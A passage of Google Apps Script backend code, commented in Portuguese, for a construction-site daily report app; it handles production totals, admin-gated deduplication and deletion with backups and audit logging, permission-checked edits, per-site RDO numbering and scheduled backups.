  var arr = linhasObj(ABA_APONT);
  if (mes) arr = arr.filter(function (x) { return normData(x.data).slice(0, 7) === mes; });
  arr.sort(function (x, y) { return String(y.data).localeCompare(String(x.data)); });
  return { ok: true, apontamentos: arr };
}

/* `mini` devolve a MINIATURA que o Drive já mantém para o arquivo, em vez
   da foto inteira. A galeria mostra cada foto num quadro de 170 px de
   altura: baixar a imagem de 1280 px para isso é ordem de grandeza a mais
   de bytes do que a tela usa, e são dezenas delas de uma vez, no 4G do
   canteiro. A foto cheia continua vindo ao ampliar, que é quando ela
   realmente é olhada.

   Se o Drive ainda não gerou a miniatura (acontece logo depois do envio),
   cai para a imagem cheia e AVISA no `mini`, para o app guardar no lugar
   certo do cache e não pedir de novo. */
function obterFotoPrivada(fileId, mini) {
  if (!fileId) return { ok: false, error: 'ID do arquivo não informado' };
  try {
    var f = DriveApp.getFileById(fileId);
    var blob = null;
    if (String(mini) === '1' || mini === true) {
      try { blob = f.getThumbnail(); } catch (e) { blob = null; }
    }
    var ehMini = !!blob;
    if (!blob) blob = f.getBlob();
    return { ok: true, mini: ehMini,
      dataUri: 'data:' + (blob.getContentType() || 'image/jpeg') +
      ';base64,' + Utilities.base64Encode(blob.getBytes()) };
  } catch (e) {
    return { ok: false, error: 'Não foi possível carregar a imagem privada: ' + e.message };
  }
}

// ------------------------------------------------------------
// RELATÓRIO — produção total por pacote num mês (ex: mes='2026-05').
// DEDUPLICA na leitura (Data+Turno+Pacote+Qtd+Apontador+Estaca), então
// o resultado é correto mesmo que a planilha ainda tenha duplicatas.
// Chamada: ?action=producaoPorPacote&mes=2026-05&callback=cb
// Se 'mes' for omitido, soma o histórico inteiro.
// ------------------------------------------------------------
/* `obra` é opcional e vale "teotonio" quando não vier — automação externa
   que já chamava este endpoint antes do multi-obra continua recebendo
   exatamente o que recebia. */
function producaoPorPacote(mes, obra) {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA + '" não encontrada' };

  var dados = aba.getDataRange().getValues();
  if (dados.length <= 1) return { ok: true, mes: mes || 'tudo', pacotes: {} };

  var obraAlvo = normObra(obra);
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iObra   = idxColuna(cab, 'obra');
  var iData   = idxColuna(cab, 'data');
  var iTurno  = idxColuna(cab, 'turno');
  var iPacId  = idxColuna(cab, 'pacote_id');
  var iPacNm  = idxColuna(cab, 'pacote_nome');
  var iQtd    = idxColuna(cab, 'quantidade');
  var iApont  = idxColuna(cab, 'apontador');
  var iEstaca = idxColuna(cab, 'local_estaca');

  function mesDe(v) {
    // Aceita Date ou string; devolve 'yyyy-MM'.
    if (v instanceof Date) return Utilities.formatDate(v, Session.getScriptTimeZone(), 'yyyy-MM');
    var s = String(v).trim();
    var m = s.match(/(\d{4})-(\d{2})/);            // 2026-05-15
    if (m) return m[1] + '-' + m[2];
    var b = s.match(/(\d{2})\/(\d{2})\/(\d{4})/);  // 15/05/2026
    if (b) return b[3] + '-' + b[2];
    var c = s.match(/(\d{2})\/(\d{2})\/(\d{2})$/); // 15/05/26
    if (c) return '20' + c[3] + '-' + c[2];
    return '';
  }

  function num(s) {
    if (s === '' || s === null || s === undefined) return 0;
    if (typeof s === 'number') return s;
    var t = String(s).replace(/\./g, '').replace(',', '.');
    var v = parseFloat(t);
    return isNaN(v) ? 0 : v;
  }

  var vistas = {};
  var pacotes = {};       // pacote_id -> { nome, qtd, lancamentos }
  var totalLinhas = 0, consideradas = 0, duplicadasIgnoradas = 0;

  for (var i = 1; i < dados.length; i++) {
    var r = dados[i];
    if (iObra !== -1 && normObra(r[iObra]) !== obraAlvo) continue;
    if (mes && mesDe(r[iData]) !== mes) continue;
    totalLinhas++;

    // dedup por conteúdo
    var chave = [
      String(iData!==-1?r[iData]:'').trim(),
      String(iTurno!==-1?r[iTurno]:'').trim().toLowerCase(),
      String(iPacId!==-1?r[iPacId]:'').trim().toLowerCase(),
      String(iQtd!==-1?r[iQtd]:'').trim(),
      String(iApont!==-1?r[iApont]:'').trim().toLowerCase(),
      String(iEstaca!==-1?r[iEstaca]:'').trim().toLowerCase()
    ].join('|');
    if (vistas[chave]) { duplicadasIgnoradas++; continue; }
    vistas[chave] = true;
    consideradas++;

    var pid = String(iPacId!==-1?r[iPacId]:'').trim() || '(sem pacote)';
    if (!pacotes[pid]) pacotes[pid] = { nome: String(iPacNm!==-1?r[iPacNm]:'').trim(), qtd: 0, lancamentos: 0 };
    pacotes[pid].qtd += num(iQtd!==-1?r[iQtd]:0);
    pacotes[pid].lancamentos++;
  }

  return {
    ok: true,
    mes: mes || 'tudo',
    totalLinhasNoMes: totalLinhas,
    consideradas: consideradas,
    duplicadasIgnoradas: duplicadasIgnoradas,
    pacotes: pacotes
  };
}

// ------------------------------------------------------------
// LIMPEZA EM LOTE NO SERVIDOR — apaga TODAS as duplicatas de uma vez.
// Faz backup automático antes. Mantém a 1ª ocorrência de cada chave:
//   Data + Turno + Pacote_ID + Quantidade + Apontador + Local_Estaca
// Retorna quantas linhas removeu — uma única chamada resolve milhares.
// ------------------------------------------------------------
function limparDuplicadosServidor(token) {
  var negado = exigirAdminEstrito(token, 'limparDuplicados');
  if (negado) return negado;
  var lock = LockService.getScriptLock();
  lock.waitLock(120000);
  try {
    var ss  = SpreadsheetApp.getActiveSpreadsheet();
    var aba = ss.getSheetByName(NOME_ABA);
    if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA + '" não encontrada' };

    var dados = aba.getDataRange().getValues();
    if (dados.length <= 1) return { ok: true, removidas: 0, total: 0 };

    var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
    var iData   = idxColuna(cab, 'data');
    var iTurno  = idxColuna(cab, 'turno');
    var iPac    = idxColuna(cab, 'pacote_id');
    var iQtd    = idxColuna(cab, 'quantidade');
    var iApont  = idxColuna(cab, 'apontador');
    var iEstaca = idxColuna(cab, 'local_estaca');

    // Backup preventivo antes de mexer em qualquer coisa.
    var nomeBackup = NOME_ABA + '_backup_' +
      Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyyMMdd_HHmmss');
    aba.copyTo(ss).setName(nomeBackup);

    // Monta a lista de linhas a MANTER (primeira ocorrência de cada chave).
    // Em vez de apagar uma a uma (lento, estoura tempo com milhares de linhas),
    // limpamos tudo e regravamos só o que fica — roda em segundos.
    var vistas = {};
    var manter = [dados[0]]; // mantém o cabeçalho
    for (var i = 1; i < dados.length; i++) {
      var r = dados[i];
      var chave = [
        String(iData   !== -1 ? r[iData]   : '').trim(),
        String(iTurno  !== -1 ? r[iTurno]  : '').trim().toLowerCase(),
        String(iPac    !== -1 ? r[iPac]    : '').trim().toLowerCase(),
        String(iQtd    !== -1 ? r[iQtd]    : '').trim(),
        String(iApont  !== -1 ? r[iApont]  : '').trim().toLowerCase(),
        String(iEstaca !== -1 ? r[iEstaca] : '').trim().toLowerCase()
      ].join('|');
      if (!vistas[chave]) { vistas[chave] = true; manter.push(r); }
    }

    var removidas = dados.length - manter.length;
    if (removidas > 0) {
      // Apaga todo o conteúdo (menos o cabeçalho) e regrava o que fica de uma vez.
      var nLinhas = aba.getLastRow();
      var nCols = aba.getLastColumn();
      if (nLinhas > 1) aba.getRange(2, 1, nLinhas - 1, nCols).clearContent();
      if (manter.length > 1) {
        aba.getRange(2, 1, manter.length - 1, manter[0].length).setValues(manter.slice(1));
      }
    }

    // Operação em massa sobre a base da medição tem de deixar rastro. Estas
    // duas eram as únicas escritas do backend que reescreviam a aba inteira
    // sem uma linha na Auditoria — e num log de auditoria o que não foi
    // registrado não aconteceu.
    registrarAuditoria(usuarioDoToken(token) || '?', perfilDoToken(token) || '?',
      'limparDuplicados', '', '', 'linhas antes: ' + (dados.length - 1),
      'removidas: ' + removidas + ' · restantes: ' + (manter.length - 1) + ' · backup: ' + nomeBackup);

    return { ok: true, removidas: removidas, total: dados.length - 1, restantes: manter.length - 1, backup: nomeBackup };
  } catch (err) {
    return { ok: false, error: String(err && err.message ? err.message : err) };
  } finally {
    lock.releaseLock();
  }
}

// ------------------------------------------------------------
// LIMPEZA POR FAIXA DE ID — apaga todas as linhas cujo ID COMEÇA com
// um prefixo (ex: '20260530' = tudo gerado em 30/05). Útil quando os
// reenrios criaram lixo num dia específico que você quer zerar.
// Faz backup antes. Chamada: ?action=apagarPorPrefixoId&prefixo=20260530
// ------------------------------------------------------------
function apagarPorPrefixoId(prefixo, token) {
  if (!prefixo) return { ok: false, error: 'prefixo não informado' };
  var negado = exigirAdminEstrito(token, 'apagarPorPrefixoId');
  if (negado) return negado;
  var lock = LockService.getScriptLock();
  lock.waitLock(120000);
  try {
    var ss  = SpreadsheetApp.getActiveSpreadsheet();
    var aba = ss.getSheetByName(NOME_ABA);
    if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA + '" não encontrada' };

    var dados = aba.getDataRange().getValues();
    if (dados.length <= 1) return { ok: true, removidas: 0, total: 0 };

    var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
    var iId = idxColuna(cab, 'id');
    if (iId === -1) return { ok: false, error: 'Coluna ID não encontrada' };

    var nomeBackup = NOME_ABA + '_backup_' +
      Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyyMMdd_HHmmss');
    aba.copyTo(ss).setName(nomeBackup);

    var p = String(prefixo).trim();
    var manter = [dados[0]];
    for (var i = 1; i < dados.length; i++) {
      if (String(dados[i][iId]).trim().indexOf(p) !== 0) manter.push(dados[i]);
    }

    var removidas = dados.length - manter.length;
    if (removidas > 0) {
      var nLinhas = aba.getLastRow(), nCols = aba.getLastColumn();
      if (nLinhas > 1) aba.getRange(2, 1, nLinhas - 1, nCols).clearContent();
      if (manter.length > 1) aba.getRange(2, 1, manter.length - 1, manter[0].length).setValues(manter.slice(1));
    }

    registrarAuditoria(usuarioDoToken(token) || '?', perfilDoToken(token) || '?',
      'apagarPorPrefixoId', '', String(prefixo), 'linhas antes: ' + (dados.length - 1),
      'removidas: ' + removidas + ' · restantes: ' + (manter.length - 1) + ' · backup: ' + nomeBackup);

    return { ok: true, removidas: removidas, total: dados.length - 1, restantes: manter.length - 1, backup: nomeBackup };
  } catch (err) {
    return { ok: false, error: String(err && err.message ? err.message : err) };
  } finally {
    lock.releaseLock();
  }
}

// ------------------------------------------------------------
// 3. updateRDO — edição inline de um serviço (por ID)
// ------------------------------------------------------------
function updateRDO(payloadJson, token) {
  var payload;
  try { payload = JSON.parse(payloadJson || '{}'); }
  catch (e) { return { ok: false, error: 'payload inválido' }; }
  if (!payload.id && !payload.ID) return { ok: false, error: 'ID não informado' };
  var id = payload.id || payload.ID;

  var aba = abaServicos();
  var dados = aba.getDataRange().getValues();
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iId = idxColuna(cab, 'id');
  if (iId === -1) return { ok: false, error: 'Coluna ID não encontrada' };
  var iDono = idxColuna(cab, 'usuario');
  if (iDono === -1) iDono = idxColuna(cab, 'apontador');

  for (var i = 1; i < dados.length; i++) {
    if (String(dados[i][iId]).trim() === String(id).trim()) {
      // Editar é menos grave que apagar, mas continua sendo mexer no registro
      // de outra pessoa: liberado para o dono, o admin e a engenharia (que
      // precisa corrigir dado errado para fechar a medição).
      var dono = iDono !== -1 ? dados[i][iDono] : '';
      var perfil = perfilDoToken(token);
      if (!podeApagarLinha(token, dono) && perfil !== 'engenharia') {
        return negarPorPermissao(token, 'updateRDO', id, dono);
      }
      var antes = [];
      Object.keys(payload).forEach(function (chave) {
        var col = idxColuna(cab, chave.toLowerCase());
        if (col !== -1 && col !== iId) {
          antes.push(chave + '=' + dados[i][col]);
          aba.getRange(i + 1, col + 1).setValue(seguro(payload[chave]));
        }
      });
      registrarAuditoria(usuarioDoToken(token), perfil, 'updateRDO', OBRA_ID, id,
        antes.join(' | '), JSON.stringify(payload));
      return { ok: true, updated: id };
    }
  }
  return { ok: false, error: 'ID não encontrado: ' + id };
}

// ------------------------------------------------------------
// 4. RDO Diário — grava por data (1 registro por data/turno)
//    Corrige 2 bugs:
//    • DUPLICAÇÃO: a célula Data costuma vir como objeto Date; a comparação
//      antiga String(Date) === "2026-06-01" nunca casava → inseria sempre.
//      Agora normaliza ambos para 'yyyy-MM-dd' antes de comparar.
//    • SEM ID: inserts não geravam ID. Agora gera 'D####' sequencial (e faz
//      backfill se uma linha existente estiver sem ID).
// ------------------------------------------------------------
function upsertRDODiario(p, deveExistir) {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };

  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var sessObra = sessaoDoToken(p.token);
  if (sessObra && !sessaoPodeNaObra(sessObra, p.obra)) {
    return negarPorObra(p.token, deveExistir ? 'updateRDODiario' : 'addRDODiario', p.obra);
  }

  garantirColuna(aba, 'obra');   // antes de ler o cabeçalho, para já vir nele
  garantirColuna(aba, 'numero_rdo');  // o número que a fiscalização lê, por obra
  /* Paralisação estruturada (motivo, horário, frente, efetivo e equipamento
     parados). São DUAS colunas com papéis diferentes:
       `paralisacoes_json`  o registro que a tela de Dias Improdutivos soma;
       `paralisado_motivo`  o resumo legível, para quem lê a planilha direto.

     A segunda precisa ser garantida aqui. `upsertRDODiario` grava por NOME DE
     COLUNA: parâmetro que não encontra coluna correspondente é descartado sem
     erro nenhum. Sem esta linha, o motivo da parada era digitado pelo
     apontador, subia na requisição e sumia em silêncio na planilha — o mesmo
     modo de falha que esta versão inteira foi feita para acabar. */
  garantirColuna(aba, 'paralisacoes_json');
  garantirColuna(aba, 'paralisado_motivo');
    var cab = cabecalhoNormalizado(aba);
    var iData = idxColuna(cab, 'data');
    var iTurno = idxColuna(cab, 'turno');
    var iId = idxColuna(cab, 'id');
    var iObra = idxColuna(cab, 'obra');
    var iNum = idxColuna(cab, 'numero_rdo');
    var dados = aba.getDataRange().getValues();

    var dataAlvo = normData(p.data);
    var turno = String(p.turno || '').trim().toLowerCase();
    var obraAlvo = normObra(p.obra);

    // A chave do diário é (obra, data, turno). Sem a obra na chave, o diário
    // do Ranário do dia 10 SOBRESCREVERIA o da Teotônio do dia 10 — um dia
    // inteiro de efetivo, clima e ocorrências apagado sem aviso.
    var linhaExistente = -1;
    for (var i = 1; i < dados.length; i++) {
      var mesmaData = dataAlvo !== '' && (iData !== -1) && normData(dados[i][iData]) === dataAlvo;
      var mesmoTurno = (iTurno === -1) || String(dados[i][iTurno]).trim().toLowerCase() === turno;
      var mesmaObra = (iObra === -1) || normObra(dados[i][iObra]) === obraAlvo;
      if (mesmaData && mesmoTurno && mesmaObra) { linhaExistente = i + 1; break; }
    }

    var registro = {};
    Object.keys(p).forEach(function (chave) {
      // 'token' é credencial, não dado do RDO: nunca vai para a planilha.
      if (chave === 'action' || chave === 'callback' || chave === 'token') return;
      registro[chave.toLowerCase()] = p[chave];
    });
    registro['obra'] = obraAlvo;
    var sessD = sessaoDoToken(p.token);
    if (sessD && sessD.usuario) registro['usuario'] = sessD.usuario;

    if (linhaExistente !== -1) {
      // ATUALIZA a linha existente (sem duplicar). Faz backfill de ID se faltar.
      if (iId !== -1 && !registro['id']) {
        var idAtual = String(dados[linhaExistente - 1][iId] == null ? '' : dados[linhaExistente - 1][iId]).trim();
        if (!idAtual) registro['id'] = gerarIdDiario(dados, iId);
      }
      // Backfill do número na linha antiga que ainda não o tem (mesmo efeito
      // de migrarNumeroRdoPorObra, sem depender de alguém rodá-la).
      if (iNum !== -1 && !registro['numero_rdo']) {
        var numAtual = String(dados[linhaExistente - 1][iNum] == null ? '' : dados[linhaExistente - 1][iNum]).trim();
        if (!numAtual) registro['numero_rdo'] = proximoNumeroRdo(dados, iNum, iObra, obraAlvo);
      }
      cab.forEach(function (nomeCol, idx) {
        if (registro.hasOwnProperty(nomeCol)) {
          aba.getRange(linhaExistente, idx + 1).setValue(seguro(registro[nomeCol]));
        }
      });
      registrarAuditoria(sessD && sessD.usuario, sessD && sessD.perfil, 'updateRDODiario', OBRA_ID,
        registro['id'] || dataAlvo, 'linha ' + linhaExistente, 'data ' + dataAlvo + ' turno ' + (turno || '-'));
      return { ok: true, updated: true, id: registro['id'] || undefined };
    } else {
      // INSERE nova linha, sempre com ID gerado (se a aba tem coluna ID).
      if (iId !== -1 && !registro['id']) {
        registro['id'] = gerarIdDiario(dados, iId);
      }
      // E com o NÚMERO do RDO contado dentro da obra — o `id` é chave técnica
      // global, o número é o que sai impresso para a fiscalização.
      if (iNum !== -1 && !registro['numero_rdo']) {
        registro['numero_rdo'] = proximoNumeroRdo(dados, iNum, iObra, obraAlvo);
      }
      var linha = cab.map(function (nomeCol) {
        return registro.hasOwnProperty(nomeCol) ? registro[nomeCol] : '';
      });
      aba.getRange(aba.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
      registrarAuditoria(sessD && sessD.usuario, sessD && sessD.perfil, 'addRDODiario', OBRA_ID,
        registro['id'] || dataAlvo, '', 'data ' + dataAlvo + ' turno ' + (turno || '-'));
      return { ok: true, inserted: true, id: registro['id'] || '' };
    }
  } finally {
    lock.releaseLock();
  }
}

// Normaliza um valor de data (Date, 'yyyy-MM-dd...' ou 'dd/MM/yyyy') para
// 'yyyy-MM-dd', para comparação confiável entre planilha e front-end.
function normData(v) {
  if (v == null || v === '') return '';
  if (v instanceof Date) {
    return Utilities.formatDate(v, Session.getScriptTimeZone(), 'yyyy-MM-dd');
  }
  var s = String(v).trim();
  if (s.indexOf('/') !== -1) {
    var p = s.split('/');
    if (p.length === 3) return p[2].slice(0, 4) + '-' + ('0' + p[1]).slice(-2) + '-' + ('0' + p[0]).slice(-2);
  }
  return s.slice(0, 10);
}

// Gera o próximo ID 'D####' a partir do maior número já presente na coluna ID
// (mantém o padrão D0001, D0002, ... e continua de onde parou).
function gerarIdDiario(dados, iId) {
  var max = 0;
  for (var i = 1; i < dados.length; i++) {
    var v = String(dados[i][iId] == null ? '' : dados[i][iId]).trim();
    var m = v.match(/(\d+)/);
    if (m) { var n = parseInt(m[1], 10); if (!isNaN(n) && n > max) max = n; }
  }
  return 'D' + ('0000' + (max + 1)).slice(-4);
}

/* -------------------------------------------------------------------
   NÚMERO DO RDO — por obra, e separado do `id`
   -------------------------------------------------------------------
   O número impresso no cabeçalho do RDO oficial saía do `id` (D####), que
   `gerarIdDiario` gera varrendo a aba INTEIRA. Mas a aba RDO_Diario é
   compartilhada por todas as obras: o primeiro RDO de uma obra nova sairia
   numerado na sequência da Teotônio — "RDO nº 87" no primeiro dia de obra —
   e as duas obras teriam numerações entrelaçadas no mesmo documento oficial.

   A separação é em dois papéis:
     `id`         chave TÉCNICA, global e única (é por ela que o app apaga e
                  edita a linha). Continua exatamente como estava.
     `numero_rdo` o número que a fiscalização lê. Conta por OBRA, do 1.

   Os RDOs que a Teotônio já emitiu mantêm o número que já foi impresso: a
   migração copia o número derivado do `id` atual, em vez de renumerar por
   data. Documento entregue à fiscalização não muda de número.
   ------------------------------------------------------------------- */
function proximoNumeroRdo(dados, iNum, iObra, obraAlvo) {
  var max = 0;
  for (var i = 1; i < dados.length; i++) {
    if (iObra !== -1 && normObra(dados[i][iObra]) !== obraAlvo) continue;
    var n = parseInt(String(dados[i][iNum] == null ? '' : dados[i][iNum]).replace(/\D/g, ''), 10);
    if (!isNaN(n) && n > max) max = n;
  }
  return max + 1;
}

/* Roda 1× no editor, depois de colar este Code.gs.
   Preenche `numero_rdo` no que já existe, PRESERVANDO o número que cada RDO
   já mostrava (o derivado do id). Só a Teotônio tem histórico, então na
   prática ela fica idêntica ao que já foi impresso e qualquer obra nova
   começa do 1. Rodar de novo é seguro: só preenche o que estiver vazio. */
function migrarNumeroRdoPorObra() {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };
  garantirColuna(aba, 'obra');
  garantirColuna(aba, 'numero_rdo');
  var cab = cabecalhoNormalizado(aba);
  var iId = idxColuna(cab, 'id');
  var iObra = idxColuna(cab, 'obra');
  var iNum = idxColuna(cab, 'numero_rdo');
  if (iNum === -1) return { ok: false, error: 'Coluna numero_rdo não criada' };

  var dados = aba.getDataRange().getValues();
  var preenchidos = 0;
  var porObra = {};   // obra -> maior número já visto, para as linhas sem id
  for (var i = 1; i < dados.length; i++) {
    if (String(dados[i][iNum] == null ? '' : dados[i][iNum]).trim() !== '') continue;
    var obra = iObra !== -1 ? normObra(dados[i][iObra]) : OBRA_ID;
    var numero = 0;
    if (iId !== -1) {
      var m = String(dados[i][iId] == null ? '' : dados[i][iId]).match(/(\d+)/);
      if (m) numero = parseInt(m[1], 10);
    }
    if (!numero || isNaN(numero)) numero = (porObra[obra] || 0) + 1;
    porObra[obra] = Math.max(porObra[obra] || 0, numero);
    aba.getRange(i + 1, iNum + 1).setValue(numero);
    preenchidos++;
  }
  Logger.log('numero_rdo preenchido em ' + preenchidos + ' linha(s): ' + JSON.stringify(porObra));
  return { ok: true, preenchidos: preenchidos, porObra: porObra };
}

// ------------------------------------------------------------
// UTILITÁRIO (rodar manualmente no editor): cria RDOs Diários VAZIOS para as
// datas de maio/2026 que ainda não têm RDO. Idempotente (não duplica datas que
// já existem) e seguro para rodar de novo.
//   • criarRDOsVaziosMaio2026()      -> só dias NÃO úteis (fim de semana + feriado)
//   • criarRDOsVaziosMaio2026(true)  -> também os dias ÚTEIS faltantes (vazios)
// Veja o resultado no menu "Execuções" / log. Dias úteis sem RDO são listados
// (não preenchidos) quando incluirDiasUteis = false.
// ------------------------------------------------------------
function criarRDOsVaziosMaio2026(incluirDiasUteis) {
  var ano = 2026, mes = 5;
  // Feriados NACIONAIS em maio/2026. Acrescente feriados municipais da obra aqui.
  var FERIADOS = ['2026-05-01'];

  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };

  var lock = LockService.getScriptLock();
  lock.waitLock(60000);
  try {
    var cab = cabecalhoNormalizado(aba);
    var iData = idxColuna(cab, 'data');
    var iId = idxColuna(cab, 'id');
    var dados = aba.getDataRange().getValues();

    var existentes = {};
    for (var i = 1; i < dados.length; i++) {
      var nd = normData(dados[i][iData]);
      if (nd) existentes[nd] = true;
    }

    var ultimoDia = new Date(ano, mes, 0).getDate();
    var criados = [], uteisSemRDO = [], jaTinham = 0;
    for (var dia = 1; dia <= ultimoDia; dia++) {
      var d = new Date(ano, mes - 1, dia);
      var iso = Utilities.formatDate(d, Session.getScriptTimeZone(), 'yyyy-MM-dd');
      var dow = d.getDay();
      var util = (dow !== 0 && dow !== 6) && FERIADOS.indexOf(iso) === -1;

      if (existentes[iso]) { jaTinham++; continue; }
      if (util && !incluirDiasUteis) { uteisSemRDO.push(iso); continue; }

      var registro = {};
      registro['obra'] = OBRA_ID;   // o dia vazio é desta obra, não das outras
      registro['data'] = iso;
      if (iId !== -1) registro['id'] = gerarIdDiario(dados, iId);
      registro['tem_turno_noturno'] = 'false';
      if (!util) registro['observacoes_gerais'] = 'Dia não útil — sem serviços';

      var linha = cab.map(function (nc) { return registro.hasOwnProperty(nc) ? registro[nc] : ''; });
      aba.appendRow(linha);
      dados.push(linha);            // p/ o próximo gerarIdDiario enxergar o novo ID
      existentes[iso] = true;
      criados.push(registro['id'] + ' ' + iso + (util ? ' (útil, vazio)' : ' (não útil)'));
    }

    var resultado = { ok: true, totalCriados: criados.length, criados: criados, jaTinham: jaTinham, diasUteisSemRDO: uteisSemRDO };
    Logger.log(JSON.stringify(resultado, null, 2));
    return resultado;
  } finally {
    lock.releaseLock();
  }
}

// Atalho para o botão ▶ Run (que não passa argumentos): cria TODAS as datas
// de maio/2026 sem RDO — inclusive os dias úteis (vazios). Veja o log em "Execuções".
function criarTodosRDOsVaziosMaio2026() {
  return criarRDOsVaziosMaio2026(true);
}

// ------------------------------------------------------------
// 5. deleteRDODiario — apaga 1 linha da aba RDO_Diario.
//    Casa por ID (texto exato OU só dígitos — cobre IDs numéricos exibidos
//    formatados, ex.: célula = 2 mostrada como "D0002"). Se o ID não casar e
//    a data tiver UM único RDO, apaga por data. Em falha, devolve uma amostra
//    dos IDs realmente presentes na aba, para diagnóstico.
// ------------------------------------------------------------
function deleteRDODiario(id, data, token) {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };

  // Apagar o RDO diário derruba o cabeçalho do dia inteiro (efetivo, clima,
  // ocorrências) — fica com o admin e com quem preencheu.
  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var dados = aba.getDataRange().getValues();
    var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
    var iId = idxColuna(cab, 'id');
    var iData = idxColuna(cab, 'data');
    var iDono = idxColuna(cab, 'usuario');
    if (iDono === -1) iDono = idxColuna(cab, 'responsavel');

    var alvo = String(id == null ? '' : id).trim();
    var alvoDig = alvo.replace(/\D/g, '');
    var alvoNum = alvoDig ? parseInt(alvoDig, 10) : null;

    // 1) por ID — exato; senão por dígitos (IDs numéricos formatados).
    if (iId !== -1 && (alvo || alvoNum !== null)) {
      for (var i = 1; i < dados.length; i++) {
        var cell = String(dados[i][iId]).trim();
        if (cell === '') continue;
        var cellDig = cell.replace(/\D/g, '');
        var cellNum = cellDig ? parseInt(cellDig, 10) : null;
        if (cell === alvo || (alvoNum !== null && cellNum !== null && cellNum === alvoNum)) {
          var donoId = iDono !== -1 ? dados[i][iDono] : '';
          if (!podeApagarLinha(token, donoId)) return negarPorPermissao(token, 'deleteRDODiario', id, donoId);
          aba.deleteRow(i + 1);
          registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'deleteRDODiario', OBRA_ID, id,
            'data: ' + (iData !== -1 ? dados[i][iData] : ''), '');
          return { ok: true, deleted: id, by: 'id' };
        }
      }
    }

    // 2) por data — só se houver exatamente UM RDO naquela data.
    if (data && iData !== -1) {
      var tz = Session.getScriptTimeZone();
      var alvoData = String(data).slice(0, 10);
      var matches = [];
      for (var j = 1; j < dados.length; j++) {
        var v = dados[j][iData];
        var iso;
        if (v instanceof Date) {
          iso = Utilities.formatDate(v, tz, 'yyyy-MM-dd');
        } else {
          var sv = String(v).trim();
          if (sv.indexOf('/') !== -1) {
            var p = sv.split('/');
            iso = (p.length === 3) ? (p[2].slice(0, 4) + '-' + ('0' + p[1]).slice(-2) + '-' + ('0' + p[0]).slice(-2)) : sv;
          } else {
            iso = sv.slice(0, 10);
          }
        }
        if (iso === alvoData) matches.push(j);
      }
      if (matches.length === 1) {
        var donoData = iDono !== -1 ? dados[matches[0]][iDono] : '';
        if (!podeApagarLinha(token, donoData)) return negarPorPermissao(token, 'deleteRDODiario', alvoData, donoData);
        aba.deleteRow(matches[0] + 1);
        registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'deleteRDODiario', OBRA_ID, id || alvoData,
          'data: ' + alvoData, '');
        return { ok: true, deleted: id, by: 'data' };
      }
      if (matches.length > 1) {
        return { ok: false, error: 'Há ' + matches.length + ' RDOs em ' + alvoData + ', mas o ID "' + id + '" não casou com a coluna ID. Veja idsVistos.', idsVistos: amostraIdsDiario(dados, iId) };
      }
    }

    return { ok: false, error: 'ID não encontrado: ' + id, idsVistos: amostraIdsDiario(dados, iId) };
  } finally {
    lock.releaseLock();
  }
}

// Amostra dos valores da coluna ID (até 25) para diagnóstico de não-casamento.
function amostraIdsDiario(dados, iId) {
  var out = [];
  for (var i = 1; i < dados.length && out.length < 25; i++) {
    out.push(iId !== -1 ? dados[i][iId] : '(sem coluna ID)');
  }
  return out;
}

// ============================================================
// AUTOMAÇÕES (gatilhos de tempo)
// Rode configurarGatilhos() UMA vez no editor (botão ▶ Run) para
// agendar o backup diário e o registro automático de chuva.
// ============================================================
function configurarGatilhos() {
  // Remove gatilhos antigos destas funções para não duplicar.
  ScriptApp.getProjectTriggers().forEach(function (t) {
    var fn = t.getHandlerFunction();
    if (fn === 'backupDiario' || fn === 'registrarClimaAuto' ||
        fn === 'limparSessoesAbandonadas') ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger('backupDiario').timeBased().everyDays(1).atHour(2).create();
  ScriptApp.newTrigger('registrarClimaAuto').timeBased().everyDays(1).atHour(5).create();
  // Sessão não expira mais sozinha; a faxina é o que evita a propriedade
  // crescer sem fim (o teto do Apps Script é 500 KB no total).
  ScriptApp.newTrigger('limparSessoesAbandonadas').timeBased().everyDays(1).atHour(3).create();
  Logger.log('Gatilhos criados: backupDiario (02h), limparSessoesAbandonadas (03h) e registrarClimaAuto (05h).');
  return { ok: true };
}

// ------------------------------------------------------------
// BACKUP DIÁRIO — copia a planilha inteira para o Drive (pasta
// "Backups Teotonio") e mantém as últimas 14 cópias.
// ------------------------------------------------------------
function backupDiario() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var arquivo = DriveApp.getFileById(ss.getId());

  var pastas = DriveApp.getFoldersByName('Backups Teotonio');
  var pasta = pastas.hasNext() ? pastas.next() : DriveApp.createFolder('Backups Teotonio');

  var nome = 'BACKUP ' + Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM-dd HH:mm') +
             ' — ' + ss.getName();
  arquivo.makeCopy(nome, pasta);

  // Retenção: mantém só as 14 cópias mais recentes.
  var copias = [];
  var it = pasta.getFiles();
  while (it.hasNext()) {
    var f = it.next();
